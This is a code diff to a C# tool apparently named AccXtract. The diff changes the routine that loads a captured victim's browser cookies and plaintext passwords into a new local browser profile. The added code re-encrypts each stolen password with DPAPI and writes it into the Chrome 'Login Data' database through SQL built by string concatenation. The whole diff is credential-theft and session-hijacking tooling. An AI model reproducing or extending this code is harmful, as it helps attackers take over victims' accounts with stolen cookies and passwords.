@@ -193,11 +193,18 @@ namespace AccXtract
                 Directory.CreateDirectory(newUserProfile);
 
                 //Add cookies to profile
-                File.Copy(capturedUserProfile + "\\cookies", newUserProfile + "\\cookies");
+                File.Copy(capturedUserProfile + "\\cookies", newUserProfile + "\\cookies", true);
 
                 #region Add passwords
                 //Add passwords to profile
+
                 string[] data = File.ReadAllLines(capturedUserProfile + "\\passwords.txt");
+
+                //connect to the extracted Login Data database
+                SQLiteConnection conn = new SQLiteConnection("Data Source=" + capturedUserProfile + "\\Login Data");
+                conn.Open();
+
+                //Begin re-encryption
                 List<string> passwords = new List<string>();
                 for (int i = 0; i < data.Length; i++)
                 {
@@ -208,11 +215,22 @@ namespace AccXtract
                     if (((i + 1) % 3) == 0)
                     {
                         passwords.Add(data[i]);
+
+                        string encryptedPassword = DPAPI.Encrypt(data[i]);
+
+                        SQLiteCommand replaceData = conn.CreateCommand();
+                        replaceData.CommandText = "UPDATE logins SET password_value = \"" + encryptedPassword + "\" WHERE action_url = \"" + data[i - 2] + "\"";
+                        replaceData.ExecuteNonQuery();
                     }
                 }
 
-                SQLiteConnection conn = new SQLiteConnection("Data Source=" + capturedUserProfile + "\\Login Data");
-                conn.Open();
+                conn.Close();
+
+                //End re-encryption
+
+                
+
+                
 
                 #endregion
 
@@ -318,5 +336,10 @@ namespace AccXtract
         }
 
         #endregion
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+
+        }
     }
 }
